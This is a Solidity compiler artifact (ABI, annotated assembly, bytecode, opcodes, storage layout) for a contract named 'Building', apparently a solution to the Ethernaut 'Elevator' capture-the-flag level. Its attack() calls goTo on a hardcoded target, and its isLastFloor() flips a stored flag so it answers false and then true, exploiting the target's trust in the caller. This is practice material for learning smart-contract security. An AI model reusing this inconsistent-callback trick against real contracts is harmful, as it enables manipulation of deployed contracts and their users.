{
	"security/etheranut/Elevator/Elevator.sol": {
		"Building": {
			"abi": [
				{
					"inputs": [],
					"name": "attack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "uint256",
							"name": "",
							"type": "uint256"
						}
					],
					"name": "isLastFloor",
					"outputs": [
						{
							"internalType": "bool",
							"name": "",
							"type": "bool"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"security/etheranut/Elevator/Elevator.sol\":379:805  contract Building {... */\n  mstore(0x40, 0x80)\n    /* \"security/etheranut/Elevator/Elevator.sol\":421:463  0x45f87994c073a3F06A25a7EBcc90FAa6bF5C444C */\n  0x45f87994c073a3f06a25a7ebcc90faa6bf5c444c\n    /* \"security/etheranut/Elevator/Elevator.sol\":404:463  address target = 0x45f87994c073a3F06A25a7EBcc90FAa6bF5C444C */\n  0x00\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/Elevator/Elevator.sol\":493:499  target */\n  0x00\n  0x00\n  swap1\n  sload\n  swap1\n  0x0100\n  exp\n  swap1\n  div\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n    /* \"security/etheranut/Elevator/Elevator.sol\":470:500  Elevator ev = Elevator(target) */\n  0x01\n  exp(0x0100, 0x00)\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/Elevator/Elevator.sol\":521:526  false */\n  0x00\n    /* \"security/etheranut/Elevator/Elevator.sol\":507:526  bool status = false */\n  0x01\n  exp(0x0100, 0x14)\n  dup2\n  sload\n  dup2\n  0xff\n  mul\n  not\n  and\n  swap1\n  dup4\n  iszero\n  iszero\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"security/etheranut/Elevator/Elevator.sol\":379:805  contract Building {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  revert(0x00, 0x00)\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"security/etheranut/Elevator/Elevator.sol\":379:805  contract Building {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      revert(0x00, 0x00)\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x5f9a4bca\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x9e5faafc\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      revert(0x00, 0x00)\n        /* \"security/etheranut/Elevator/Elevator.sol\":533:737  function isLastFloor(uint256) external returns (bool){... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"security/etheranut/Elevator/Elevator.sol\":743:802  function attack() public {... */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      stop\n        /* \"security/etheranut/Elevator/Elevator.sol\":533:737  function isLastFloor(uint256) external returns (bool){... */\n    tag_8:\n        /* \"security/etheranut/Elevator/Elevator.sol\":581:585  bool */\n      0x00\n        /* \"security/etheranut/Elevator/Elevator.sol\":610:615  false */\n      0x00\n        /* \"security/etheranut/Elevator/Elevator.sol\":600:615  status == false */\n      iszero\n      iszero\n        /* \"security/etheranut/Elevator/Elevator.sol\":600:606  status */\n      0x01\n      0x14\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xff\n      and\n        /* \"security/etheranut/Elevator/Elevator.sol\":600:615  status == false */\n      iszero\n      iszero\n      sub\n        /* \"security/etheranut/Elevator/Elevator.sol\":597:683  if(status == false){... */\n      tag_14\n      jumpi\n        /* \"security/etheranut/Elevator/Elevator.sol\":640:644  true */\n      0x01\n        /* \"security/etheranut/Elevator/Elevator.sol\":631:637  status */\n      dup1\n      0x14\n        /* \"security/etheranut/Elevator/Elevator.sol\":631:644  status = true */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"security/etheranut/Elevator/Elevator.sol\":666:671  false */\n      0x00\n        /* \"security/etheranut/Elevator/Elevator.sol\":659:671  return false */\n      swap1\n      pop\n      jump(tag_13)\n        /* \"security/etheranut/Elevator/Elevator.sol\":597:683  if(status == false){... */\n    tag_14:\n        /* \"security/etheranut/Elevator/Elevator.sol\":702:707  false */\n      0x00\n        /* \"security/etheranut/Elevator/Elevator.sol\":693:699  status */\n      0x01\n      0x14\n        /* \"security/etheranut/Elevator/Elevator.sol\":693:707  status = false */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xff\n      mul\n      not\n      and\n      swap1\n      dup4\n      iszero\n      iszero\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"security/etheranut/Elevator/Elevator.sol\":725:729  true */\n      0x01\n        /* \"security/etheranut/Elevator/Elevator.sol\":718:729  return true */\n      swap1\n      pop\n        /* \"security/etheranut/Elevator/Elevator.sol\":533:737  function isLastFloor(uint256) external returns (bool){... */\n    tag_13:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"security/etheranut/Elevator/Elevator.sol\":743:802  function attack() public {... */\n    tag_12:\n        /* \"security/etheranut/Elevator/Elevator.sol\":779:781  ev */\n      0x01\n      0x00\n      swap1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"security/etheranut/Elevator/Elevator.sol\":779:786  ev.goTo */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xed9a7134\n        /* \"security/etheranut/Elevator/Elevator.sol\":787:793  114514 */\n      0x01bf52\n        /* \"security/etheranut/Elevator/Elevator.sol\":779:794  ev.goTo(114514) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      revert(0x00, 0x00)\n    tag_18:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_20\n      jumpi\n      returndatacopy(0x00, 0x00, returndatasize)\n      revert(0x00, returndatasize)\n    tag_20:\n      pop\n      pop\n      pop\n      pop\n        /* \"security/etheranut/Elevator/Elevator.sol\":743:802  function attack() public {... */\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_22:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      0x00\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:411   */\n    tag_24:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":400:405   */\n      dup2\n        /* \"#utility.yul\":389:405   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:411   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":417:539   */\n    tag_25:\n        /* \"#utility.yul\":490:514   */\n      tag_39\n        /* \"#utility.yul\":508:513   */\n      dup2\n        /* \"#utility.yul\":490:514   */\n      tag_24\n      jump\t// in\n    tag_39:\n        /* \"#utility.yul\":483:488   */\n      dup2\n        /* \"#utility.yul\":480:515   */\n      eq\n        /* \"#utility.yul\":470:533   */\n      tag_40\n      jumpi\n        /* \"#utility.yul\":529:530   */\n      0x00\n        /* \"#utility.yul\":526:527   */\n      0x00\n        /* \"#utility.yul\":519:531   */\n      revert\n        /* \"#utility.yul\":470:533   */\n    tag_40:\n        /* \"#utility.yul\":417:539   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":545:684   */\n    tag_26:\n        /* \"#utility.yul\":591:596   */\n      0x00\n        /* \"#utility.yul\":629:635   */\n      dup2\n        /* \"#utility.yul\":616:636   */\n      calldataload\n        /* \"#utility.yul\":607:636   */\n      swap1\n      pop\n        /* \"#utility.yul\":645:678   */\n      tag_42\n        /* \"#utility.yul\":672:677   */\n      dup2\n        /* \"#utility.yul\":645:678   */\n      tag_25\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":545:684   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":690:1019   */\n    tag_7:\n        /* \"#utility.yul\":749:755   */\n      0x00\n        /* \"#utility.yul\":798:800   */\n      0x20\n        /* \"#utility.yul\":786:795   */\n      dup3\n        /* \"#utility.yul\":777:784   */\n      dup5\n        /* \"#utility.yul\":773:796   */\n      sub\n        /* \"#utility.yul\":769:801   */\n      slt\n        /* \"#utility.yul\":766:885   */\n      iszero\n      tag_44\n      jumpi\n        /* \"#utility.yul\":804:883   */\n      tag_45\n      tag_22\n      jump\t// in\n    tag_45:\n        /* \"#utility.yul\":766:885   */\n    tag_44:\n        /* \"#utility.yul\":924:925   */\n      0x00\n        /* \"#utility.yul\":949:1002   */\n      tag_46\n        /* \"#utility.yul\":994:1001   */\n      dup5\n        /* \"#utility.yul\":985:991   */\n      dup3\n        /* \"#utility.yul\":974:983   */\n      dup6\n        /* \"#utility.yul\":970:992   */\n      add\n        /* \"#utility.yul\":949:1002   */\n      tag_26\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":939:1002   */\n      swap2\n      pop\n        /* \"#utility.yul\":895:1012   */\n      pop\n        /* \"#utility.yul\":690:1019   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1025:1115   */\n    tag_27:\n        /* \"#utility.yul\":1059:1066   */\n      0x00\n        /* \"#utility.yul\":1102:1107   */\n      dup2\n        /* \"#utility.yul\":1095:1108   */\n      iszero\n        /* \"#utility.yul\":1088:1109   */\n      iszero\n        /* \"#utility.yul\":1077:1109   */\n      swap1\n      pop\n        /* \"#utility.yul\":1025:1115   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1121:1230   */\n    tag_28:\n        /* \"#utility.yul\":1202:1223   */\n      tag_49\n        /* \"#utility.yul\":1217:1222   */\n      dup2\n        /* \"#utility.yul\":1202:1223   */\n      tag_27\n      jump\t// in\n    tag_49:\n        /* \"#utility.yul\":1197:1200   */\n      dup3\n        /* \"#utility.yul\":1190:1224   */\n      mstore\n        /* \"#utility.yul\":1121:1230   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1236:1446   */\n    tag_10:\n        /* \"#utility.yul\":1323:1327   */\n      0x00\n        /* \"#utility.yul\":1361:1363   */\n      0x20\n        /* \"#utility.yul\":1350:1359   */\n      dup3\n        /* \"#utility.yul\":1346:1364   */\n      add\n        /* \"#utility.yul\":1338:1364   */\n      swap1\n      pop\n        /* \"#utility.yul\":1374:1439   */\n      tag_51\n        /* \"#utility.yul\":1436:1437   */\n      0x00\n        /* \"#utility.yul\":1425:1434   */\n      dup4\n        /* \"#utility.yul\":1421:1438   */\n      add\n        /* \"#utility.yul\":1412:1418   */\n      dup5\n        /* \"#utility.yul\":1374:1439   */\n      tag_28\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":1236:1446   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1452:1542   */\n    tag_29:\n        /* \"#utility.yul\":1502:1509   */\n      0x00\n        /* \"#utility.yul\":1531:1536   */\n      dup2\n        /* \"#utility.yul\":1520:1536   */\n      swap1\n      pop\n        /* \"#utility.yul\":1452:1542   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1548:1608   */\n    tag_30:\n        /* \"#utility.yul\":1576:1579   */\n      0x00\n        /* \"#utility.yul\":1597:1602   */\n      dup2\n        /* \"#utility.yul\":1590:1602   */\n      swap1\n      pop\n        /* \"#utility.yul\":1548:1608   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1614:1782   */\n    tag_31:\n        /* \"#utility.yul\":1677:1686   */\n      0x00\n        /* \"#utility.yul\":1710:1776   */\n      tag_55\n        /* \"#utility.yul\":1728:1775   */\n      tag_56\n        /* \"#utility.yul\":1737:1774   */\n      tag_57\n        /* \"#utility.yul\":1768:1773   */\n      dup5\n        /* \"#utility.yul\":1737:1774   */\n      tag_29\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":1728:1775   */\n      tag_30\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":1710:1776   */\n      tag_24\n      jump\t// in\n    tag_55:\n        /* \"#utility.yul\":1697:1776   */\n      swap1\n      pop\n        /* \"#utility.yul\":1614:1782   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1788:1945   */\n    tag_32:\n        /* \"#utility.yul\":1888:1938   */\n      tag_59\n        /* \"#utility.yul\":1932:1937   */\n      dup2\n        /* \"#utility.yul\":1888:1938   */\n      tag_31\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1883:1886   */\n      dup3\n        /* \"#utility.yul\":1876:1939   */\n      mstore\n        /* \"#utility.yul\":1788:1945   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1951:2199   */\n    tag_17:\n        /* \"#utility.yul\":2057:2061   */\n      0x00\n        /* \"#utility.yul\":2095:2097   */\n      0x20\n        /* \"#utility.yul\":2084:2093   */\n      dup3\n        /* \"#utility.yul\":2080:2098   */\n      add\n        /* \"#utility.yul\":2072:2098   */\n      swap1\n      pop\n        /* \"#utility.yul\":2108:2192   */\n      tag_61\n        /* \"#utility.yul\":2189:2190   */\n      0x00\n        /* \"#utility.yul\":2178:2187   */\n      dup4\n        /* \"#utility.yul\":2174:2191   */\n      add\n        /* \"#utility.yul\":2165:2171   */\n      dup5\n        /* \"#utility.yul\":2108:2192   */\n      tag_32\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1951:2199   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212209bb0b5ce727148f53556ecd8c11570b319567194b177f87a358b652a104202aa64736f6c634300081d0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040527345f87994c073a3f06a25a7ebcc90faa6bf5c444c5f5f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f5f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f600160146101000a81548160ff02191690831515021790555034801560db575f5ffd5b50610285806100e95f395ff3fe608060405234801561000f575f5ffd5b5060043610610034575f3560e01c80635f9a4bca146100385780639e5faafc14610068575b5f5ffd5b610052600480360381019061004d9190610196565b610072565b60405161005f91906101db565b60405180910390f35b6100706100d3565b005b5f5f1515600160149054906101000a900460ff161515036100af5760018060146101000a81548160ff0219169083151502179055505f90506100ce565b5f600160146101000a81548160ff021916908315150217905550600190505b919050565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663ed9a71346201bf526040518263ffffffff1660e01b81526004016101309190610236565b5f604051808303815f87803b158015610147575f5ffd5b505af1158015610159573d5f5f3e3d5ffd5b50505050565b5f5ffd5b5f819050919050565b61017581610163565b811461017f575f5ffd5b50565b5f813590506101908161016c565b92915050565b5f602082840312156101ab576101aa61015f565b5b5f6101b884828501610182565b91505092915050565b5f8115159050919050565b6101d5816101c1565b82525050565b5f6020820190506101ee5f8301846101cc565b92915050565b5f819050919050565b5f819050919050565b5f61022061021b610216846101f4565b6101fd565b610163565b9050919050565b61023081610206565b82525050565b5f6020820190506102495f830184610227565b9291505056fea26469706673582212209bb0b5ce727148f53556ecd8c11570b319567194b177f87a358b652a104202aa64736f6c634300081d0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH20 0x45F87994C073A3F06A25A7EBCC90FAA6BF5C444C PUSH0 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH0 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH0 PUSH1 0x1 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP CALLVALUE DUP1 ISZERO PUSH1 0xDB JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH2 0x285 DUP1 PUSH2 0xE9 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x5F9A4BCA EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x68 JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x52 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x4D SWAP2 SWAP1 PUSH2 0x196 JUMP JUMPDEST PUSH2 0x72 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5F SWAP2 SWAP1 PUSH2 0x1DB JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x70 PUSH2 0xD3 JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH0 ISZERO ISZERO PUSH1 0x1 PUSH1 0x14 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO ISZERO SUB PUSH2 0xAF JUMPI PUSH1 0x1 DUP1 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH0 SWAP1 POP PUSH2 0xCE JUMP JUMPDEST PUSH0 PUSH1 0x1 PUSH1 0x14 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP PUSH1 0x1 SWAP1 POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xED9A7134 PUSH3 0x1BF52 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x130 SWAP2 SWAP1 PUSH2 0x236 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x147 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x159 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x175 DUP2 PUSH2 0x163 JUMP JUMPDEST DUP2 EQ PUSH2 0x17F JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x190 DUP2 PUSH2 0x16C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1AB JUMPI PUSH2 0x1AA PUSH2 0x15F JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x1B8 DUP5 DUP3 DUP6 ADD PUSH2 0x182 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x1D5 DUP2 PUSH2 0x1C1 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1EE PUSH0 DUP4 ADD DUP5 PUSH2 0x1CC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x220 PUSH2 0x21B PUSH2 0x216 DUP5 PUSH2 0x1F4 JUMP JUMPDEST PUSH2 0x1FD JUMP JUMPDEST PUSH2 0x163 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x230 DUP2 PUSH2 0x206 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x249 PUSH0 DUP4 ADD DUP5 PUSH2 0x227 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP12 0xB0 0xB5 0xCE PUSH19 0x7148F53556ECD8C11570B319567194B177F87A CALLDATALOAD DUP12 PUSH6 0x2A104202AA64 PUSH20 0x6F6C634300081D00330000000000000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "129000",
						"executionCost": "75156",
						"totalCost": "204156"
					},
					"external": {
						"attack()": "infinite",
						"isLastFloor(uint256)": "27124"
					}
				},
				"methodIdentifiers": {
					"attack()": "9e5faafc",
					"isLastFloor(uint256)": "5f9a4bca"
				}
			},
			"storageLayout": {
				"storage": [
					{
						"astId": 41,
						"contract": "security/etheranut/Elevator/Elevator.sol:Building",
						"label": "target",
						"offset": 0,
						"slot": "0",
						"type": "t_address"
					},
					{
						"astId": 47,
						"contract": "security/etheranut/Elevator/Elevator.sol:Building",
						"label": "ev",
						"offset": 0,
						"slot": "1",
						"type": "t_contract(Elevator)38"
					},
					{
						"astId": 50,
						"contract": "security/etheranut/Elevator/Elevator.sol:Building",
						"label": "status",
						"offset": 20,
						"slot": "1",
						"type": "t_bool"
					}
				],
				"types": {
					"t_address": {
						"encoding": "inplace",
						"label": "address",
						"numberOfBytes": "20"
					},
					"t_bool": {
						"encoding": "inplace",
						"label": "bool",
						"numberOfBytes": "1"
					},
					"t_contract(Elevator)38": {
						"encoding": "inplace",
						"label": "contract Elevator",
						"numberOfBytes": "20"
					}
				}
			},
			"userdoc": {
				"kind": "user",
				"methods": {},
				"version": 1
			}
		}
	}
}